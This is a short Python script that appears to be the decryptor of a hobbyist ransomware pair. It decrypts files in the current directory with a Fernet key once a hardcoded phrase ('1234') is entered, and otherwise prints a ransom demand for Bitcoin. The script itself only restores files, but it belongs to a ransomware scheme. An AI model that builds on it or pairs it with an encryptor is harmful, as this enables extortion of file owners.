#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "main.py" or file == "test.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()
print(key)

with open("test.key", "rb") as key:
		secretkey = key.read()

secretphrase = "1234"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		decrypt_content = Fernet(secretkey).decrypt(content)

		with open(file, "wb") as thefile:
			thefile.write(decrypt_content)
		print("congrats, you're files are decrypted. Have fun! :)")
else:
	print("Sorry wrong Secret Phrase, you owe me 500 more BTC")	
